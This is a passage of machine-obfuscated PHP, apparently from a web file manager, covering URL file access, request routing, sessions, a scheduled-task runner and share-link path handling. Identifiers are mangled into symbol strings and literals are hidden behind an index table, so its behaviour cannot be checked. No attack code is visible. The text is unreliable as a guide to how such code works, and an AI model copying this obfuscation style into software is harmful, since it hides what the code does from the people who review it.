_objectMeta($¯Äé˘å´) { $è∏ö®Â¿ =& $_SERVER[Á≈ ä ∞]; if ($¯Äé˘å´ == $è∏ö®Â¿[22] || $¯Äé˘å´ == $è∏ö®Â¿[18]) { return array(); } $ªµµ“È¸ = $this->ussRequest($¯Äé˘å´, $è∏ö®Â¿[1497]); if (!$ªµµ“È¸[$è∏ö®Â¿[1194]]) { return null; } $áƒâ¬€ò = isset($ªµµ“È¸[$è∏ö®Â¿[1196]]) ? $ªµµ“È¸[$è∏ö®Â¿[1196]] : array(); if (!isset($áƒâ¬€ò[$è∏ö®Â¿[1498]])) { return null; } $ì˙ºÜø = array($è∏ö®Â¿[43] => isset($áƒâ¬€ò[$è∏ö®Â¿[1498]]) ? $áƒâ¬€ò[$è∏ö®Â¿[1498]] : null, $è∏ö®Â¿[86] => isset($áƒâ¬€ò[$è∏ö®Â¿[1499]]) ? $áƒâ¬€ò[$è∏ö®Â¿[1499]] : null, $è∏ö®Â¿[222] => isset($áƒâ¬€ò[$è∏ö®Â¿[1500]]) ? $áƒâ¬€ò[$è∏ö®Â¿[1500]] : null, $è∏ö®Â¿[1467] => isset($áƒâ¬€ò[$è∏ö®Â¿[1501]]) ? $áƒâ¬€ò[$è∏ö®Â¿[1501]] : null); $ì˙ºÜø[$è∏ö®Â¿[1468]] = isset($áƒâ¬€ò[$è∏ö®Â¿[1502]]) ? strtotime($áƒâ¬€ò[$è∏ö®Â¿[1502]]) : $ì˙ºÜø[$è∏ö®Â¿[1467]]; return $ì˙ºÜø; } protected function _isFolder($ÇÃÃ˝∫ï) { $‡¿ÀÖÅê =& $_SERVER[Á≈ ä ∞]; if ($ÇÃÃ˝∫ï == $‡¿ÀÖÅê[22] || $ÇÃÃ˝∫ï == $‡¿ÀÖÅê[18]) { return !0; } $ßÆ¯ã›è = $this->_objectMeta($ÇÃÃ˝∫ï); return isset($ßÆ¯ã›è[$‡¿ÀÖÅê[43]]) && $ßÆ¯ã›è[$‡¿ÀÖÅê[43]] == $‡¿ÀÖÅê[85] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Øæµ≤ﬁÒ = false) { } public function exist($πÆìÜù™) { $ü∂ù≈˛π = $this->info($πÆìÜù™); return $ü∂ù≈˛π[$_SERVER[Á≈ ä ∞][211]]; } public function isFile($™ß†“Î∑) { $Ñ®€≥ΩË = $this->info($™ß†“Î∑); return $Ñ®€≥ΩË[$_SERVER[Á≈ ä ∞][211]]; } public function isFolder($∆—¥åù¨) { return !1; } public function size($ÊòØ‰Ì¿) { $©•∂ûÓ• = $this->info($ÊòØ‰Ì¿); return $©•∂ûÓ•[$_SERVER[Á≈ ä ∞][86]]; } public function info($âàöêﬁ”) { return $this->infoParse($âàöêﬁ”); } public function infoAuth($§“Ñ¯õå) { return $this->infoParse($§“Ñ¯õå); } public function infoWithChildren($∞ï–ÿù¡) { return $this->infoParse($∞ï–ÿù¡); } public function infoFull($ó—ˆ¢’ ) { return $this->infoParse($ó—ˆ¢’ ); } private function infoParse($Ç˛∆«¬æ) { $Ñ«≈ﬁÀ€ =& $_SERVER[Á≈ ä ∞]; $Ê¶ë∆–¨ = $this->header($Ç˛∆«¬æ); if (!$Ê¶ë∆–¨ || !$Ê¶ë∆–¨[$Ñ«≈ﬁÀ€[757]]) { return !1; } $≈–úËñ¨ = _get($Ê¶ë∆–¨, $Ñ«≈ﬁÀ€[346], 0); $Èê◊áÜ˝ = array($Ñ«≈ﬁÀ€[42] => $Ê¶ë∆–¨[$Ñ«≈ﬁÀ€[42]], $Ñ«≈ﬁÀ€[94] => $Ç˛∆«¬æ, $Ñ«≈ﬁÀ€[43] => $Ñ«≈ﬁÀ€[209], $Ñ«≈ﬁÀ€[86] => intval($≈–úËñ¨), $Ñ«≈ﬁÀ€[184] => get_path_ext($Ê¶ë∆–¨[$Ñ«≈ﬁÀ€[42]]), $Ñ«≈ﬁÀ€[1381] => $≈–úËñ¨ > 0 && $Ê¶ë∆–¨[$Ñ«≈ﬁÀ€[1503]], $Ñ«≈ﬁÀ€[1382] => !1); return $Èê◊áÜ˝; } private function header($◊æ˚øªÆ) { $Ÿ°Ö¿ÓÒ =& $_SERVER[Á≈ ä ∞]; if (isset(self::$_cacheHeader[$◊æ˚øªÆ])) { return self::$_cacheHeader[$◊æ˚øªÆ]; } $Î–£»⁄ê = isset($GLOBALS[$Ÿ°Ö¿ÓÒ[1504]]) ? $GLOBALS[$Ÿ°Ö¿ÓÒ[1504]] : !1; $GLOBALS[$Ÿ°Ö¿ÓÒ[1504]] = !0; self::$_cacheHeader[$◊æ˚øªÆ] = url_header($◊æ˚øªÆ); $GLOBALS[$Ÿ°Ö¿ÓÒ[1504]] = $Î–£»⁄ê; return self::$_cacheHeader[$◊æ˚øªÆ]; } public function hashSimple($„Åäî˛î, $ÙÁÌ¬÷√ = false) { $ª’©‡ä∆ =& $_SERVER[Á≈ ä ∞]; $Æ«ÈõËÅ = $this->info($„Åäî˛î); if (!$Æ«ÈõËÅ || !$Æ«ÈõËÅ[$ª’©‡ä∆[211]]) { return !1; } $⁄˛‰§◊Í = $Æ«ÈõËÅ[$ª’©‡ä∆[86]]; $ø›Ω◊≥∫ = 200; $˛ãÇúóÀ = 50; if ($⁄˛‰§◊Í <= $ø›Ω◊≥∫ * $˛ãÇúóÀ) { return md5($this->fileSubstr($„Åäî˛î, 0, $⁄˛‰§◊Í)) . $⁄˛‰§◊Í; } $û‘Ã˚í∂ = intval($⁄˛‰§◊Í / $˛ãÇúóÀ); $êÌπÉ€Ò = $ª’©‡ä∆[22]; $∏Áø˜©œ = timeFloat(); $Ö˜ä≥Ãœ = 15; for ($ﬁ∏˝ıÔ© = 0; $ﬁ∏˝ıÔ© < $˛ãÇúóÀ; $ﬁ∏˝ıÔ©++) { if (timeFloat() - $∏Áø˜©œ > $Ö˜ä≥Ãœ) { return !1; } $Ωä¡˝±™ = $this->fileSubstr($„Åäî˛î, $û‘Ã˚í∂ * $ﬁ∏˝ıÔ©, $ø›Ω◊≥∫); if (!$Ωä¡˝±™) { return !1; } $êÌπÉ€Ò .= $Ωä¡˝±™; } $êÌπÉ€Ò .= $this->fileSubstr($„Åäî˛î, $⁄˛‰§◊Í - $ø›Ω◊≥∫, $ø›Ω◊≥∫); return md5($êÌπÉ€Ò) . $⁄˛‰§◊Í; } public function getContent($¸–°à É) { return $this->fileSubstr($¸–°à É); } public function fileSubstr($ˆÎ∞¨©Ë, $ıó´æ¸ = 0, $Ω◊´ ñÚ = -1) { $ƒÌèÍ†® =& $_SERVER[Á≈ ä ∞]; $®î∫Æßµ = $this->info($ˆÎ∞¨©Ë); if (!$®î∫Æßµ || !$®î∫Æßµ[$ƒÌèÍ†®[211]] && $®î∫Æßµ[$ƒÌèÍ†®[86]] > 1024 * 1024 * 10) { return !1; } if ($Ω◊´ ñÚ === -1) { $Ω◊´ ñÚ = $®î∫Æßµ[$ƒÌèÍ†®[86]]; } if ($Ω◊´ ñÚ == 0) { return $ƒÌèÍ†®[22]; } $ÔÁ§®‘— = array($ƒÌèÍ†®[1505] . $ıó´æ¸ . $ƒÌèÍ†®[789] . ($ıó´æ¸ + $Ω◊´ ñÚ - 1)); $†˘ÚÆ√» = url_request($ˆÎ∞¨©Ë, $ƒÌèÍ†®[240], !1, $ÔÁ§®‘—, !1, !1, 1); return $†˘ÚÆ√»[$ƒÌèÍ†®[1196]] ? $†˘ÚÆ√»[$ƒÌèÍ†®[1196]] : $ƒÌèÍ†®[22]; } public function download($‘”◊Ö¡, $°√ò¡±„) { Downloader::start($‘”◊Ö¡, $°√ò¡±„); return $°√ò¡±„; } } goto dê™—Çä–À; e±ôÿ·ÇÊË: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\x5b\x5e\x2f\x5d\x2b", "\x3a\156\165\155" => "\133\60\55\71\135\x2b", "\72\x61\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($°Œ‰‡◊ó, $œ‹ºñØ˝) { $ßÏ◊≤âî =& $_SERVER[Á≈ ä ∞]; if ($°Œ‰‡◊ó == $ßÏ◊≤âî[1602]) { $ÄÛÕΩÊ£ = array_map($ßÏ◊≤âî[1603], $œ‹ºñØ˝[0]); $®ôæû˘¶ = strpos($œ‹ºñØ˝[1], $ßÏ◊≤âî[18]) === 0 ? $œ‹ºñØ˝[1] : $ßÏ◊≤âî[18] . $œ‹ºñØ˝[1]; $‹∫∫˙ø¨ = $œ‹ºñØ˝[2]; } else { $ÄÛÕΩÊ£ = null; $®ôæû˘¶ = strpos($œ‹ºñØ˝[0], $ßÏ◊≤âî[18]) === 0 ? $œ‹ºñØ˝[0] : $ßÏ◊≤âî[18] . $œ‹ºñØ˝[0]; $‹∫∫˙ø¨ = $œ‹ºñØ˝[1]; } array_push(self::$maps, $ÄÛÕΩÊ£); array_push(self::$routes, $®ôæû˘¶); array_push(self::$methods, strtoupper($°Œ‰‡◊ó)); array_push(self::$callbacks, $‹∫∫˙ø¨); } public static function error($‚˛„‰ñı) { self::$errorCallback = $‚˛„‰ñı; } public static function haltOnMatch($ôÓÈ”¸Ÿ = true) { self::$halts = $ôÓÈ”¸Ÿ; } public static function dispatch() { $Â·˘ÿ”– =& $_SERVER[Á≈ ä ∞]; $Œ‡ë¯è  = parse_url($_SERVER[$Â·˘ÿ”–[1604]], PHP_URL_PATH); $†áÎ˜ô® = $_SERVER[$Â·˘ÿ”–[169]]; $‘ÌÕãå™ = array_keys(static::$patterns); $˘˜»—ˆπ = array_values(static::$patterns); $ëŒñù⁄è = !1; self::$routes = preg_replace($Â·˘ÿ”–[1272], $Â·˘ÿ”–[18], self::$routes); if (in_array($Œ‡ë¯è , self::$routes)) { $ÈºÒÅˆ¶ = array_keys(self::$routes, $Œ‡ë¯è ); foreach ($ÈºÒÅˆ¶ as $Åõ†Èæè) { if (self::$methods[$Åõ†Èæè] == $†áÎ˜ô® || self::$methods[$Åõ†Èæè] == $Â·˘ÿ”–[1605] || in_array($†áÎ˜ô®, self::$maps[$Åõ†Èæè])) { $ëŒñù⁄è = !0; if (!is_object(self::$callbacks[$Åõ†Èæè])) { $€õ·Ï“… = explode($Â·˘ÿ”–[18], self::$callbacks[$Åõ†Èæè]); $å¸≥˚Üé = end($€õ·Ï“…); $Ω∑Ïûæ¡ = explode($Â·˘ÿ”–[1606], $å¸≥˚Üé); $ÉÛ’÷°≥ = new $Ω∑Ïûæ¡[0](); $ÉÛ’÷°≥->{$Ω∑Ïûæ¡[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Åõ†Èæè]); if (self::$halts) { return; } } } } } else { $ıõ≥‘Î≈ = 0; foreach (self::$routes as $Åõ†Èæè) { if (strpos($Åõ†Èæè, $Â·˘ÿ”–[4]) !== !1) { $Åõ†Èæè = str_replace($‘ÌÕãå™, $˘˜»—ˆπ, $Åõ†Èæè); } if (preg_match($Â·˘ÿ”–[1607] . $Åõ†Èæè . $Â·˘ÿ”–[1608], $Œ‡ë¯è , $∆∫Úœ´º)) { if (self::$methods[$ıõ≥‘Î≈] == $†áÎ˜ô® || self::$methods[$ıõ≥‘Î≈] == $Â·˘ÿ”–[1605] || !empty(self::$maps[$ıõ≥‘Î≈]) && in_array($†áÎ˜ô®, self::$maps[$ıõ≥‘Î≈])) { $ëŒñù⁄è = !0; array_shift($∆∫Úœ´º); if (!is_object(self::$callbacks[$ıõ≥‘Î≈])) { $€õ·Ï“… = explode($Â·˘ÿ”–[18], self::$callbacks[$ıõ≥‘Î≈]); $å¸≥˚Üé = end($€õ·Ï“…); $Ω∑Ïûæ¡ = explode($Â·˘ÿ”–[1606], $å¸≥˚Üé); $ÉÛ’÷°≥ = new $Ω∑Ïûæ¡[0](); if (!method_exists($ÉÛ’÷°≥, $Ω∑Ïûæ¡[1])) { echo $Â·˘ÿ”–[1609]; } else { call_user_func_array(array($ÉÛ’÷°≥, $Ω∑Ïûæ¡[1]), $∆∫Úœ´º); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ıõ≥‘Î≈], $∆∫Úœ´º); if (self::$halts) { return; } } } } $ıõ≥‘Î≈++; } } if ($ëŒñù⁄è == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $™™†◊Û√ =& $_SERVER[Á≈ ä ∞]; header($_SERVER[$™™†◊Û√[1610]] . $™™†◊Û√[1611]); echo $™™†◊Û√[1612]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Â·˘ÿ”–[1604]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $â‹«ãˆﬁ =& $_SERVER[Á≈ ä ∞]; static $„–ñÚ„î = false; if ($„–ñÚ„î) { return $„–ñÚ„î; } $®ÅˆÎ–â = $GLOBALS[$â‹«ãˆﬁ[16]][$â‹«ãˆﬁ[358]]; self::$sessionTime = $®ÅˆÎ–â[$â‹«ãˆﬁ[1613]]; $ûÊ÷—°Ó = isset($GLOBALS[$â‹«ãˆﬁ[1614]]) ? $GLOBALS[$â‹«ãˆﬁ[1614]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ûÊ÷—°Ó)) { self::$sessionSign = Cookie::get($ûÊ÷—°Ó); } else { self::$sessionSign = guid(); } } Cookie::setSafe($ûÊ÷—°Ó, self::$sessionSign, self::$sessionTime); $∑…¸éø„ = $®ÅˆÎ–â[$â‹«ãˆﬁ[1615]]; $π¯ŒÕ≥† = $®ÅˆÎ–â[$∑…¸éø„]; $º»ÖòƒÆ = $®ÅˆÎ–â[$â‹«ãˆﬁ[835]]; switch ($∑…¸éø„) { case $â‹«ãˆﬁ[31]: self::$handle = Model($â‹«ãˆﬁ[836]); break; case $â‹«ãˆﬁ[837]: self::$handle = new CacheRedis($π¯ŒÕ≥†, $º»ÖòƒÆ); break; case $â‹«ãˆﬁ[838]: self::$handle = new CacheMemcached($π¯ŒÕ≥†, $º»ÖòƒÆ); break; case $â‹«ãˆﬁ[209]: $π¯ŒÕ≥†[$â‹«ãˆﬁ[94]] = $π¯ŒÕ≥†[$â‹«ãˆﬁ[94]] . $â‹«ãˆﬁ[1616]; self::$handle = new CacheFile($π¯ŒÕ≥†, $º»ÖòƒÆ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $„–ñÚ„î = new self(); return $„–ñÚ„î; } public static function getBySign($ø°ÿíº∑) { CacheLock::lock($ø°ÿíº∑); $ËŒçú®ì = self::$handle->get($ø°ÿíº∑); CacheLock::unlock($ø°ÿíº∑); $ËŒçú®ì = unserialize($ËŒçú®ì); return is_array($ËŒçú®ì) ? $ËŒçú®ì : array(); } public static function setBySign($öÒ‘†ÅÜ, $å∑øàıú) { CacheLock::lock($öÒ‘†ÅÜ); self::$handle->set($öÒ‘†ÅÜ, serialize($å∑øàıú), self::$sessionTime); CacheLock::unlock($öÒ‘†ÅÜ); } public static function sign($ßÇ¢Ä£ç = false) { $ßÇ¢Ä£ç && (self::$sessionSign = $ßÇ¢Ä£ç); self::init(); return self::$sessionSign; } public static function set($à›ë¶¨˘, $Çâ¶œäº = false) { self::init(); if (is_array($à›ë¶¨˘)) { foreach ($à›ë¶¨˘ as $˜≈º€õ¶ => $„©À•¡·) { array_set_value(self::$data, $˜≈º€õ¶, $„©À•¡·); } } else { array_set_value(self::$data, $à›ë¶¨˘, $Çâ¶œäº); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ƒê¶Ïññ = false) { self::init(); if (!$ƒê¶Ïññ) { return self::$data; } return array_get_value(self::$data, $ƒê¶Ïññ); } public static function remove($¶÷›‰‹∫) { self::init(); unset(self::$data[$¶÷›‰‹∫]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Á≈ ä ∞][840])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Û”»û™¬ =& $_SERVER[Á≈ ä ∞]; if (self::valueGet($Û”»û™¬[757]) != $Û”»û™¬[98]) { return; } if (self::valueGet($Û”»û™¬[1617]) == $Û”»û™¬[98]) { $Ó÷™ÛÌÖ = self::valueGet($Û”»û™¬[1618]); if (time() - $Ó÷™ÛÌÖ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$Û”»û™¬[1619]] = 1; self::valueSet($Û”»û™¬[1617], $Û”»û™¬[98]); self::log($Û”»û™¬[1620] . ACTION . $Û”»û™¬[1621]); Session::$data = array(); Session::$sessionSign = $Û”»û™¬[22]; $GLOBALS[$Û”»û™¬[512]] = 1; Hook::bind($Û”»û™¬[1622], $Û”»û™¬[1623]); $Ä¯‚Ïﬁú = 0; while (!0) { self::cacheClear(); if (self::valueGet($Û”»û™¬[757]) != $Û”»û™¬[98]) { self::valueSet($Û”»û™¬[1617], $Û”»û™¬[207]); self::log($Û”»û™¬[1624]); die; } $∫˜äôÙŒ = time(); if ($∫˜äôÙŒ - $Ä¯‚Ïﬁú >= 60) { self::valueSet(array($Û”»û™¬[1617] => $Û”»û™¬[98], $Û”»û™¬[1618] => $∫˜äôÙŒ), !1); $Ä¯‚Ïﬁú = $∫˜äôÙŒ; } if (!file_exists(USER_SYSTEM . $Û”»û™¬[1625])) { self::valueSet(array($Û”»û™¬[1617] => $Û”»û™¬[207], $Û”»û™¬[757] => $Û”»û™¬[207]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ıΩ◊ó¬  =& $_SERVER[Á≈ ä ∞]; http_close(); self::valueSet($ıΩ◊ó¬ [757], $ıΩ◊ó¬ [207]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ıΩ◊ó¬ [1617] => $ıΩ◊ó¬ [207], $ıΩ◊ó¬ [757] => $ıΩ◊ó¬ [98]), !1); } public static function taskSwitch() { $≥±ƒÌ´Æ =& $_SERVER[Á≈ ä ∞]; $∑ÿÒ§é• = self::valueGet($≥±ƒÌ´Æ[757]) == $≥±ƒÌ´Æ[98] ? $≥±ƒÌ´Æ[207] : $≥±ƒÌ´Æ[98]; self::valueSet($≥±ƒÌ´Æ[757], $∑ÿÒ§é•); } public static function shutdownEvent() { $—◊†ª±Í =& $_SERVER[Á≈ ä ∞]; self::valueSet($—◊†ª±Í[1617], $—◊†ª±Í[207]); self::log($—◊†ª±Í[1626]); } public static function config($‡™Œ◊Ú≤, $¥à Êù·) { self::valueSet($_SERVER[Á≈ ä ∞][757], $‡™Œ◊Ú≤); } private static function taskRunAll() { $ïº˙áøﬂ =& $_SERVER[Á≈ ä ∞]; $»π˝Ü•ì = timeFloat(); $ëŸ≤˙◊  = Model($ïº˙áøﬂ[1627])->listData(); $ô˘“ÒùÇ = count($ëŸ≤˙◊ ); for ($êá≈¸ã¨ = 0; $êá≈¸ã¨ < $ô˘“ÒùÇ; $êá≈¸ã¨++) { $…Ã–Çƒ„ = $ëŸ≤˙◊ [$êá≈¸ã¨]; if (!$…Ã–Çƒ„[$ïº˙áøﬂ[408]] || $…Ã–Çƒ„[$ïº˙áøﬂ[1628]] != $ïº˙áøﬂ[98]) { continue; } if (!self::taskTimeCheck($…Ã–Çƒ„)) { continue; } self::taskRun($…Ã–Çƒ„); } Hook::trigger($ïº˙áøﬂ[1629]); self::taskQueueRun($»π˝Ü•ì); } private static function taskQueueRun($üË∏Øç¬) { $ÊÊõÇÁﬂ = 10; while (!0) { $É®ô¿Àƒ = TaskQueue::run(); if ($É®ô¿Àƒ === !1) { break; } if (timeFloat() - $üË∏Øç¬ >= $ÊÊõÇÁﬂ) { break; } } } private static function taskTimeCheck($ˆ€ãòÈ¸) { $äÎ®Œö˙ =& $_SERVER[Á≈ ä ∞]; $–¶õáËß = json_decode($ˆ€ãòÈ¸[$äÎ®Œö˙[213]], !0); $£ Áı«à = intval($ˆ€ãòÈ¸[$äÎ®Œö˙[1618]]); $Ù®ÛçÔ≤ = strtotime($äÎ®Œö˙[1630] . $–¶õáËß[$äÎ®Œö˙[1631]] . $äÎ®Œö˙[1632]) - strtotime($äÎ®Œö˙[1633]); $¥ﬂ«Àç¯ = time() - strtotime(date($äÎ®Œö˙[1634]) . $äÎ®Œö˙[1635]); $áÇ◊ô’õ = $¥ﬂ«Àç¯ >= $Ù®ÛçÔ≤ && $¥ﬂ«Àç¯ <= $Ù®ÛçÔ≤ + 3600; switch ($–¶õáËß[$äÎ®Œö˙[43]]) { case $äÎ®Œö˙[1636]: if (time() - $£ Áı«à < 3600 * 24 * 30) { return !1; } if ($–¶õáËß[$äÎ®Œö˙[1636]] == date($äÎ®Œö˙[1637]) && $áÇ◊ô’õ) { return !0; } break; case $äÎ®Œö˙[1638]: if (time() - $£ Áı«à < 3600 * 24 * 7) { return !1; } $“·°ëà· = date($äÎ®Œö˙[1639]) == 0 ? 7 : date($äÎ®Œö˙[1639]); if ($–¶õáËß[$äÎ®Œö˙[1638]] == $“·°ëà· && $áÇ◊ô’õ) { return !0; } break; case $äÎ®Œö˙[1631]: if (time() - $£ Áı«à < 3600 * 24) { return !1; } if ($áÇ◊ô’õ) { return !0; } break; case $äÎ®Œö˙[1640]: if (time() - $£ Áı«à >= floatval($–¶õáËß[$äÎ®Œö˙[1640]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Æ∞†ÂâÃ =& $_SERVER[Á≈ ä ∞]; static $äõƒ“ÆÄ = 0; $ˆ±·ı’Í = 300; if (!$äõƒ“ÆÄ) { $äõƒ“ÆÄ = time(); } if (time() - $äõƒ“ÆÄ < $ˆ±·ı’Í) { return; } $äõƒ“ÆÄ = time(); $ô≥©˛ﬁˆ = Model($Æ∞†ÂâÃ[522])->db($Æ∞†ÂâÃ[22]); if ($ô≥©˛ﬁˆ) { $ô≥©˛ﬁˆ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Æ∞†ÂâÃ[1641], $Æ∞†ÂâÃ[1642]); die; } } public static function taskRun($¨∏÷…¯Ú) { $Ù”‰Ü◊ç =& $_SERVER[Á≈ ä ∞]; self::log($Ù”‰Ü◊ç[1643] . $¨∏÷…¯Ú[$Ù”‰Ü◊ç[408]] . $Ù”‰Ü◊ç[1644] . $¨∏÷…¯Ú[$Ù”‰Ü◊ç[42]] . $Ù”‰Ü◊ç[1645] . $¨∏÷…¯Ú[$Ù”‰Ü◊ç[1646]]); Model($Ù”‰Ü◊ç[1627])->run($¨∏÷…¯Ú[$Ù”‰Ü◊ç[408]]); $Ê µ¨≈á = timeFloat(); $°ÓÓã¸Ü = $Ù”‰Ü◊ç[22]; switch ($¨∏÷…¯Ú[$Ù”‰Ü◊ç[43]]) { case $Ù”‰Ü◊ç[316]: $‡ŒÒΩ≤‡ = url_request($¨∏÷…¯Ú[$Ù”‰Ü◊ç[1646]], $Ù”‰Ü◊ç[240], !1, !1, !1, !1, 10); if ($‡ŒÒΩ≤‡[$Ù”‰Ü◊ç[757]]) { $°ÓÓã¸Ü = strlen($‡ŒÒΩ≤‡[$Ù”‰Ü◊ç[1196]]); } break; case $Ù”‰Ü◊ç[239]: $°ÓÓã¸Ü = Hook::apply($¨∏÷…¯Ú[$Ù”‰Ü◊ç[1646]]); default: break; } Model($Ù”‰Ü◊ç[1647])->add(array($Ù”‰Ü◊ç[1648] => $Ù”‰Ü◊ç[22], $Ù”‰Ü◊ç[1649] => $Ù”‰Ü◊ç[207], $Ù”‰Ü◊ç[43] => $Ù”‰Ü◊ç[1650] . $¨∏÷…¯Ú[$Ù”‰Ü◊ç[408]], $Ù”‰Ü◊ç[1651] => json_encode(array($Ù”‰Ü◊ç[42] => $¨∏÷…¯Ú[$Ù”‰Ü◊ç[42]], $Ù”‰Ü◊ç[1652] => timeFloat() - $Ê µ¨≈á, $Ù”‰Ü◊ç[302] => $°ÓÓã¸Ü)))); $Êñß‘∂˝ = $°ÓÓã¸Ü ? $Ù”‰Ü◊ç[1653] . $°ÓÓã¸Ü : $Ù”‰Ü◊ç[22]; self::log($Ù”‰Ü◊ç[1654] . $¨∏÷…¯Ú[$Ù”‰Ü◊ç[408]] . $Ù”‰Ü◊ç[174] . $Êñß‘∂˝); return !0; } private static function valueGet($Çç¡¡«Æ) { $¥Ù¶ìì¿ =& $_SERVER[Á≈ ä ∞]; $ŸæÍøŸ≥ = $¥Ù¶ìì¿[1655]; $‡ÿ´ºµù = Model($¥Ù¶ìì¿[444])->get($Çç¡¡«Æ, $ŸæÍøŸ≥); if (is_null($‡ÿ´ºµù)) { Model($¥Ù¶ìì¿[444])->set($¥Ù¶ìì¿[757], $¥Ù¶ìì¿[98], $ŸæÍøŸ≥); Model($¥Ù¶ìì¿[444])->set($¥Ù¶ìì¿[1617], $¥Ù¶ìì¿[207], $ŸæÍøŸ≥); $‡ÿ´ºµù = Model($¥Ù¶ìì¿[444])->get($Çç¡¡«Æ, $ŸæÍøŸ≥); } return $‡ÿ´ºµù; } private static function valueSet($á‰·˜¿Ê, $∏⁄ﬂÂ¬‰) { $√áÇ•Üü =& $_SERVER[Á≈ ä ∞]; $¨ä√”’© = $√áÇ•Üü[1656]; CacheLock::lock($¨ä√”’©); $éÀ“ ñ§ = Model($√áÇ•Üü[444])->set($á‰·˜¿Ê, $∏⁄ﬂÂ¬‰, $√áÇ•Üü[1655]); CacheLock::unlock($¨ä√”’©); return $éÀ“ ñ§; } protected static function log($æÆª∑≤Ô) { write_log($æÆª∑≤Ô, $_SERVER[Á≈ ä ∞][1642]); } private static function cacheClear() { $éπ˝ﬂ¨≥ =& $_SERVER[Á≈ ä ∞]; Cache::clearMemory(Model($éπ˝ﬂ¨≥[444])->cacheKey($éπ˝ﬂ¨≥[1655])); Cache::clearMemory(Model($éπ˝ﬂ¨≥[444])->cacheKey($éπ˝ﬂ¨≥[1657])); Model($éπ˝ﬂ¨≥[1627])->cacheClear(); self::closeDatabase(); } } goto dûÉππﬁΩ£; eúØç‹ØÀ”: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÄÔÿ˘åñ) { $this->pathParse = $ÄÔÿ˘åñ; $this->model = Model($_SERVER[Á≈ ä ∞][1330]); } public function getPathOuter($”ùÎ¬·Ö) { $®±äº›– =& $_SERVER[Á≈ ä ∞]; if (!$”ùÎ¬·Ö) { return $”ùÎ¬·Ö; } $Á‘˜∞Ù§ = $this->parse($”ùÎ¬·Ö); return trim(KodIO::makeShare($this->pathParse[$®±äº›–[408]], $Á‘˜∞Ù§[$®±äº›–[408]]), $®±äº›–[18]); } protected function infoParse($‡¿∂Í«˛, $˙Êèö¬à = false, $¬—Ø≈Øﬁ = false) { $∑Ñ–Óê≠ =& $_SERVER[Á≈ ä ∞]; $ÂÀÔÚõ§ = $this->pathParse[$∑Ñ–Óê≠[408]]; $Í¶¢íÂª = trim($this->pathParse[$∑Ñ–Óê≠[1172]], $∑Ñ–Óê≠[18]); return Action($∑Ñ–Óê≠[1338])->sharePathInfo($ÂÀÔÚõ§, $Í¶¢íÂª, $˙Êèö¬à); } public function infoFull($ÉÁ«˚⁄ü) { $Êâ–ú÷£ =& $_SERVER[Á≈ ä ∞]; $ä•Í¸Ê˝ = explode($Êâ–ú÷£[18], trim($ÉÁ«˚⁄ü, $Êâ–ú÷£[18])); if (count($ä•Í¸Ê˝) > 1) { $π◊œŸûï = implode($Êâ–ú÷£[18], array_splice($ä•Í¸Ê˝, 1)); $ÑÄ”Ê˘Ï = $this->model->pathInfoByPath($ä•Í¸Ê˝[0], $π◊œŸûï); if (!$ÑÄ”Ê˘Ï) { return !1; } $this->pathParse[$Êâ–ú÷£[1172]] = $ÑÄ”Ê˘Ï[$Êâ–ú÷£[411]]; } return $this->infoParse($ÉÁ«˚⁄ü); } public function listAll($óÅà√Áª) { $ÓíÇçö≠ =& $_SERVER[Á≈ ä ∞]; $™¥ö†¥Ø = IO::info($this->pathParse[$ÓíÇçö≠[94]]); if (!$™¥ö†¥Ø) { return array(); } $©¢ö‡á¸ = $this->model->listAll($óÅà√Áª); $˘Áˆâ•· = Model($ÓíÇçö≠[610])->getInfo($™¥ö†¥Ø[$ÓíÇçö≠[498]]); $îÏ™™∆Ä = Action($ÓíÇçö≠[1338]); foreach ($©¢ö‡á¸ as &$Ü’¢´ Ï) { check_abort(); $Ü’¢´ Ï[$ÓíÇçö≠[96]] = $îÏ™™∆Ä->_shareItemeParse($Ü’¢´ Ï[$ÓíÇçö≠[96]], $˘Áˆâ•·); } unset($Ü’¢´ Ï); return $©¢ö‡á¸; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ˆôÄØ’Ω) { $this->pathParse = $ˆôÄØ’Ω; $this->model = Model($_SERVER[Á≈ ä ∞][1330]); } protected function infoParse($–≤√ÍÍé, $›⁄ŒùÏ” = false, $∑Éêòçè = false) { $àÇÅ˚ÆØ =& $_SERVER[Á≈ ä ∞]; return Action($àÇÅ˚ÆØ[1178])->sharePathInfo($this->pathParse[$àÇÅ˚ÆØ[94]], !0, $›⁄ŒùÏ”); } public function listPath($∞¡ßª≥∏, $Ωä˜¥Ãπ = false) { $ô‚∏˚Ê» =& $_SERVER[Á≈ ä ∞]; $Ä™…÷Å˙ = parent::listPath($∞¡ßª≥∏, $Ωä˜¥Ãπ); if (!$Ä™…÷Å˙) { return $Ä™…÷Å˙; } if (is_array($Ä™…÷Å˙[$ô‚∏˚Ê»[1339]])) { $Ä™…÷Å˙[$ô‚∏˚Ê»[1339]] = 